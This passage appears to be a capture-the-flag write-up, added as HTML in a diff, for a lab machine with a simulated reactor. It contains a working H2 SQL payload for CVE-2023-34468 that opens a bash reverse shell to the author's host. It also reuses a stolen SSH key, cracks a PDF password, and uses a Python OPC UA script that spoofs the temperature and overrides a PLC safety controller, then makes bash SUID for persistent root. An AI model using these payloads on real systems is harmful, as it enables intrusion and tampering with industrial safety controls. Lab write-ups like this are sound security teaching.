+                <p><img src="./media/image3.png" alt="SQL processor configuration in NiFi with the H2 driver set up for RCE via CVE-2023-34468" /></p>
+
+                <p>The SQL script served from my machine contains embedded Java code that uses H2's <code>CREATE ALIAS</code> functionality to execute system commands:</p>
+
+                <pre><code class="language-sql"><span class="code-keyword">CREATE ALIAS</span> <span class="code-keyword">IF NOT EXISTS</span> <span class="code-function">SHELLEXEC</span> <span class="code-keyword">AS</span> <span class="code-string">$$
+String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(
+        Runtime.getRuntime().exec(command).getInputStream()
+    ).useDelimiter("\\\\A");
+    return s.hasNext() ? s.next() : "";
+}
+$$</span>;
+
+<span class="code-keyword">CALL</span> <span class="code-function">SHELLEXEC</span>(<span class="code-string">'bash -i >& /dev/tcp/10.10.14.142/443 0>&1'</span>);</code></pre>
+
+                <p>This script creates a custom SQL function called <code>SHELLEXEC</code> that executes operating system commands via <code>Runtime.getRuntime().exec()</code>. When invoked with <code>CALL</code>, it executes a bash reverse shell connecting back to my attacking machine.</p>
+
+                <p>With this I successfully send a reverse shell and gain access as the <code>nifi</code> user, which is a service account similar to <code>www-data</code>, used to run the Apache NiFi process.</p>
+
+                <h2>Internal Enumeration</h2>
+                <p>Once inside the machine, I investigate the locally listening ports:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:<span class="code-number">8081</span>   0.0.0.0:*
+tcp  LISTEN  0   50  127.0.0.1:<span class="code-number">8080</span>   0.0.0.0:*
+tcp  LISTEN  0   50  127.0.0.1:<span class="code-number">38913</span>  0.0.0.0:*
+tcp  LISTEN  0  100  127.0.0.1:<span class="code-number">4840</span></code></pre>
+
+                <p>I check the <code>/etc/passwd</code> file to identify system users:</p>
+
+                <pre><code class="language-plaintext">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+operator:x:1001:1001::/home/operator:/bin/bash
+nifi:x:998:998::/opt/nifi:/usr/sbin/nologin
+plc:x:997:997::/opt/ot:/usr/sbin/nologin</code></pre>
+
+                <p>I notice that <code>root</code> is running a binary called <code>helix-safety</code> that I cannot inspect directly:</p>
+
+                <pre><code class="language-plaintext">root  1633  1.1  0.0  2992  1048  ?  Ss  <span class="code-comment">/opt/helix/bin/helix-safety</span></code></pre>
+
+                <p>The <code>/opt/helix</code> directory has restricted permissions to the <code>helixsvc</code> group:</p>
+
+                <pre><code class="language-plaintext">drwxr-x--- 9 root helixsvc 4.0K May  5 10:18 helix</code></pre>
+
+                <p>Using <code>pspy64</code>, I detect that the <code>www-data</code> and <code>plc</code> users run additional Helix ecosystem binaries:</p>
+
+                <pre><code class="language-plaintext">CMD: UID=<span class="code-number">997</span>  PID=<span class="code-number">1676</span>  | /opt/helix/bin/helix-plc
+CMD: UID=<span class="code-number">33</span>   PID=<span class="code-number">1677</span>  | /opt/helix/bin/helix-hmi</code></pre>
+
+                <p>I also find an interesting binary that can only be read and executed by the <code>operator</code> user and <code>root</code>:</p>
+
+                <pre><code class="language-bash">nifi@helix:/tmp$ find / -group operator 2>/dev/null
+<span class="code-string">/home/operator</span>
+<span class="code-string">/usr/local/sbin/helix-maint-console</span>
+
+-rwxr-x--- 1 root operator 932 Jan 25 19:12 /usr/local/sbin/helix-maint-console</code></pre>
+
+                <h2>Internal Web Service - Port 8081</h2>
+                <p>Accessing port <code>8081</code> via port forwarding, I find a Flask web application acting as the Helix system control panel:</p>
+
+                <p><img src="./media/image2.png" alt="Flask web interface on port 8081 showing the Helix control panel with system status information, maintenance window status, and OPC UA service reference" /></p>
+
+                <p>This panel shows relevant system information. Two things catch my attention: the mention of a <strong>privileged maintenance window</strong> and the reference to the internal <strong>OPC UA</strong> protocol:</p>
+
+                <pre><code class="language-plaintext">OPC UA (internal): opc.tcp://127.0.0.1:<span class="code-number">4840</span>/helix/</code></pre>
+
+                <h3>Investigating OPC UA</h3>
+                <p>Researching OPC UA with the <code>opc.tcp</code> protocol and port <code>4840</code>, I discover it's <strong>OPC Unified Architecture</strong>, a standard protocol used in industrial IoT for PLC automation, SCADA systems, and other industrial equipment. Port 4840 is the official default port for OPC UA and uses the binary <code>opc.tcp</code> protocol for efficiency.</p>
+
+                <p>Using Python's <code>asyncua</code> library and some quick scripts, I investigate port 4840 and discover it's a control system for a <strong>simulated nuclear reactor</strong>. The OPC UA server node structure reveals the following:</p>
+
+                <pre><code class="language-plaintext">[Object]   Plant (ns=2;i=1)
+  [Object]   Reactor (ns=2;i=2)
+    [Variable] TemperatureRaw       (ns=2;i=3)
+    [Variable] Temperature          (ns=2;i=4)
+    [Variable] Pressure             (ns=2;i=5)
+    [Variable] CalibrationOffset    (ns=2;i=6)
+  [Object]   Safety (ns=2;i=7)
+    [Variable] RodsInserted         (ns=2;i=8)
+    [Variable] EmergencyCooling     (ns=2;i=9)
+    [Variable] TripActive           (ns=2;i=10)
+  [Object]   Control (ns=2;i=11)
+    [Variable] Mode                 (ns=2;i=12)
+    [Variable] TestOverride         (ns=2;i=13)
+    [Variable] ResetTrip            (ns=2;i=14)</code></pre>
+
+                <p>I can also read the current system values:</p>
+
+                <pre><code class="language-plaintext">=======================================================
+Helix Plant Status
+=======================================================
+[ Reactor ]
+  TemperatureRaw          <span class="code-number">283.999</span>
+  Temperature             <span class="code-number">283.999</span>
+  Pressure                <span class="code-number">68.999</span>
+  CalibrationOffset (rw)  <span class="code-number">0.0</span>
+
+[ Safety ]
+  RodsInserted            <span class="code-keyword">False</span>
+  EmergencyCooling        <span class="code-keyword">False</span>
+  TripActive              <span class="code-keyword">False</span>
+
+[ Control ]
+  Mode          (rw)      NORMAL
+  TestOverride  (rw)      <span class="code-keyword">False</span>
+  ResetTrip     (rw)      <span class="code-keyword">False</span></code></pre>
+
+                <p>I notice that some variables are read-write (<code>rw</code>), such as <code>CalibrationOffset</code>, <code>Mode</code>, <code>TestOverride</code>, and <code>ResetTrip</code>. This will be important later, but for now I don't find a direct way to leverage this information.</p>
+
+                <h2>Lateral Movement - From nifi to operator</h2>
+                <p>Investigating the NiFi directories, I find a backup SSH key belonging to the <code>operator</code> user in a support bundles directory:</p>
+
+                <pre><code class="language-bash">nifi@helix:/opt/nifi-1.21.0$ ls -lah support-bundles/
+total 12K
+drwxr-x--- 2 nifi nifi 4.0K May  5 10:18 .
+drwxrwxr-x 16 nifi nifi 4.0K May  5 10:18 ..
+-rw-r----- 1 nifi nifi  411 Jan 25 13:15 <span class="code-string">operator_id_ed25519.bak</span></code></pre>
+
+                <p>I transfer the private key to my machine and use it to gain SSH access as the <code>operator</code> user, obtaining the user flag.</p>
+
+                <h2>Privilege Escalation</h2>
+                <h3>Enumeration as operator</h3>
+                <p>Inside the <code>operator</code> home directory, I find two interesting files. The first is an image of the reactor control system:</p>
+
+                <p><img src="./media/image1.png" alt="Image showing the nuclear reactor control system diagram from Helix Industries with industrial control system components" /></p>
+
+                <p>The second is a PDF called <strong>"Operator Control & Safety Guide"</strong> that is password-protected. I extract the hash with <code>pdf2john</code> and use <code>john</code> for brute force:</p>
+
+                <pre><code class="language-bash">pdf2john <span class="code-string">"Operator Control & Safety Guide.pdf"</span> > pdf.hash
+
+john pdf.hash --wordlist=<span class="code-string">/usr/share/wordlists/rockyou.txt</span>
+<span class="code-comment"># Using default input encoding: UTF-8</span>
+<span class="code-comment"># Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])</span>
+<span class="code-comment"># Cost 1 (revision) is 6 for all loaded hashes</span>
+<span class="code-comment"># Will run 6 OpenMP threads</span>
+<span class="code-comment"># operator1     (Operator Control & Safety Guide.pdf)</span>
+
+john pdf.hash --show
+<span class="code-comment"># Operator Control & Safety Guide.pdf:operator1</span></code></pre>
+
+                <p>The PDF password is <code>operator1</code>.</p>
+
+                <h3>PDF Contents - Maintenance Window</h3>
+                <p>The document contains general safety guidelines and system explanations. The most interesting part for privilege escalation is the section about the <strong>maintenance window</strong>:</p>
+
+                <blockquote>
+                    <p><strong>"7. Maintenance Operating Window</strong><br>
+                    The PLC defines a maintenance operating window where certain diagnostic tools become available. This window opens when:<br>
+                    • Temperature reaches approximately <strong>295°C</strong> OR Pressure <strong>73 bar</strong><br>
+                    • Pressure & Temp remains below trip thresholds<br>
+                    • No safety trip is active<br><br>
+                    This window exists below trip limits but above normal operating conditions. The window is intentionally narrow to ensure maintenance actions are time-limited and closely monitored."</p>
+                </blockquote>
+
+                <h3>operator's sudo privileges</h3>
+                <p>I check the <code>sudo</code> privileges for the <code>operator</code> user:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo -l
+<span class="code-comment"># User operator may run the following commands on helix:</span>
+<span class="code-comment">#     (root) NOPASSWD: /usr/local/sbin/helix-maint-console</span></code></pre>
+
+                <p>At first it doesn't seem to do anything, since the maintenance window is closed:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo helix-maint-console
+<span class="code-string">Maintenance window CLOSED.</span></code></pre>
+
+                <h3>helix-maint-console Script Analysis</h3>
+                <p>Since it's a bash script, I can read its contents and understand how it works:</p>
+
+                <pre><code class="language-bash"><span class="code-comment">#!/bin/bash</span>
+<span class="code-keyword">set</span> -euo pipefail
+
+<span class="code-variable">FLAG</span>=<span class="code-string">"/opt/helix/state/maintenance_window"</span>
+
+<span class="code-function">read_until</span>() { <span class="code-builtin">cat</span> <span class="code-string">"$FLAG"</span> <span class="code-number">2</span>>/dev/null || <span class="code-keyword">true</span>; }
+
+<span class="code-function">window_ok</span>() {
+    [ -f <span class="code-string">"$FLAG"</span> ] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    <span class="code-keyword">local</span> until_ts now
+    <span class="code-variable">until_ts</span>=<span class="code-string">"$(read_until)"</span>
+    <span class="code-variable">now</span>=<span class="code-string">"$(date +%s)"</span>
+    [[ <span class="code-string">"$until_ts"</span> =~ ^[0-9]+$ ]] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    [ <span class="code-string">"$now"</span> -lt <span class="code-string">"$until_ts"</span> ] || <span class="code-keyword">return</span> <span class="code-number">1</span>
+    <span class="code-keyword">return</span> <span class="code-number">0</span>
+}
+
+<span class="code-keyword">if</span> ! window_ok; <span class="code-keyword">then</span>
+    <span class="code-builtin">echo</span> <span class="code-string">"Maintenance window CLOSED."</span>
+    <span class="code-keyword">exit</span> <span class="code-number">1</span>
+<span class="code-keyword">fi</span>
+
+<span class="code-variable">until_ts</span>=<span class="code-string">"$(read_until)"</span>
+<span class="code-variable">now</span>=<span class="code-string">"$(date +%s)"</span>
+<span class="code-variable">remaining</span>=$((<span class="code-variable">until_ts</span>-<span class="code-variable">now</span>))
+
+<span class="code-builtin">echo</span> <span class="code-string">"[+] Privileged maintenance access granted"</span>
+<span class="code-builtin">echo</span> <span class="code-string">"[!] Window expires in ${remaining} seconds"</span>
+<span class="code-builtin">echo</span> <span class="code-string">"[!] Session will be terminated automatically"</span>
+
+<span class="code-variable">SCOPE</span>=<span class="code-string">"helix-maint-$$"</span>
+
+systemd-run --quiet --scope --unit=<span class="code-string">"$SCOPE"</span> \
+    --property=KillMode=control-group \
+    --property=SendSIGHUP=yes \
+    /bin/bash -p -i
+
+<span class="code-keyword">exit</span> <span class="code-number">0</span></code></pre>
+
+                <p>The script checks if the file <code>/opt/helix/state/maintenance_window</code> exists and if it contains a future timestamp. If the window is active, it launches an interactive shell with <code>root</code> privileges via <code>systemd-run</code>. The shell is temporary and will be automatically terminated when the window expires.</p>
+
+                <p>The web interface on port 8081 confirms this information and shows the current maintenance window status:</p>
+
+                <blockquote>
+                    <p>"Privileged Maintenance Window — Status: CLOSED<br>
+                    No maintenance window file present.<br>
+                    This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."</p>
+                </blockquote>
+
+                <h3>Attack Plan</h3>
+                <p>If I can get the maintenance window to activate and create the file <code>/opt/helix/state/maintenance_window</code>, I'll be able to gain temporary <code>root</code> access with the <code>sudo /usr/local/sbin/helix-maint-console</code> command. Then I'll only need to set the SUID bit on <code>/bin/bash</code> to make this access permanent.</p>
+
+                <p>Recalling the OPC UA server information, the reactor variables show that the current temperature is ~284°C and I need it to reach ~295°C. The <code>CalibrationOffset</code> variable is read-write and allows me to adjust the temperature value without changing the actual sensor reading.</p>
+
+                <h3>PLC Manipulation via OPC UA</h3>
+                <p>To activate the maintenance window, I use a Python script with the <code>asyncua</code> library to interact with the PLC. The script activates maintenance mode, enables <code>TestOverride</code> to allow the changes, and increases the temperature via the <code>CalibrationOffset</code> variable with an arbitrary value:</p>
+
+                <pre><code class="language-python"><span class="code-import">import</span> asyncio
+<span class="code-import">from</span> asyncua <span class="code-import">import</span> Client, ua
+
+<span class="code-variable">URL</span> = <span class="code-string">"opc.tcp://127.0.0.1:4840/helix/"</span>
+
+<span class="code-keyword">async</span> <span class="code-keyword">def</span> <span class="code-function">write</span>(client, node_id, value, label):
+    node = client.get_node(node_id)
+    dv = <span class="code-keyword">await</span> node.read_data_value()
+    vtype = dv.Value.VariantType
+    <span class="code-keyword">await</span> node.write_value(ua.DataValue(ua.Variant(value, vtype)))
+    <span class="code-builtin">print</span>(<span class="code-string">f"  [+] </span>{label}<span class="code-string"> = </span>{value<span class="code-operator">!r</span>}<span class="code-string">"</span>)
+
+<span class="code-keyword">async</span> <span class="code-keyword">def</span> <span class="code-function">main</span>():
+    <span class="code-keyword">async</span> <span class="code-keyword">with</span> Client(url=<span class="code-variable">URL</span>) <span class="code-keyword">as</span> client:
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=12"</span>, <span class="code-string">"MAINTENANCE"</span>, <span class="code-string">"Mode"</span>)
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=13"</span>, <span class="code-keyword">True</span>,          <span class="code-string">"TestOverride"</span>)
+        <span class="code-keyword">await</span> write(client, <span class="code-string">"ns=2;i=6"</span>,  <span class="code-number">14.1</span>,          <span class="code-string">"CalibrationOffset"</span>)
+
+asyncio.run(main())</code></pre>
+
+                <p>The script modifies three key variables: it changes <code>Mode</code> to <code>MAINTENANCE</code>, enables <code>TestOverride</code> to allow changes to operating conditions, and sets a <code>CalibrationOffset</code> of <code>14.1</code> which, added to the base temperature of ~284°C, exceeds the 295°C threshold required to activate the window.</p>
+
+                <p>This successfully activates the maintenance window:</p>
+
+                <p><img src="./media/image4.png" alt="Web panel on port 8081 showing that the maintenance window has been successfully activated after manipulating PLC variables via OPC UA" /></p>
+
+                <h3>Getting root access</h3>
+                <p>Now that the maintenance file has been created and the window is active, I can obtain temporary <code>root</code> access through the <code>helix-maint-console</code> script. I leverage this window to set the SUID bit on <code>/bin/bash</code> and make the access permanent:</p>
+
+                <pre><code class="language-bash">operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
+<span class="code-string">[+] Privileged maintenance access granted</span>
+<span class="code-string">[!] Window expires in 116 seconds</span>
+<span class="code-string">[!] Session will be terminated automatically</span>
+root@helix:/home/operator# <span class="code-keyword">chmod</span> u+s /bin/bash
+root@helix:/home/operator# <span class="code-keyword">exit</span>
+exit
+operator@helix:~$ bash -p
+bash-5.1# <span class="code-builtin">whoami</span>
+<span class="code-string">root</span></code></pre>
+
+                <p>With the SUID bit set on <code>/bin/bash</code>, I can get a root shell at any time by running <code>bash -p</code>, achieving full privileges over the system and obtaining the root flag.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
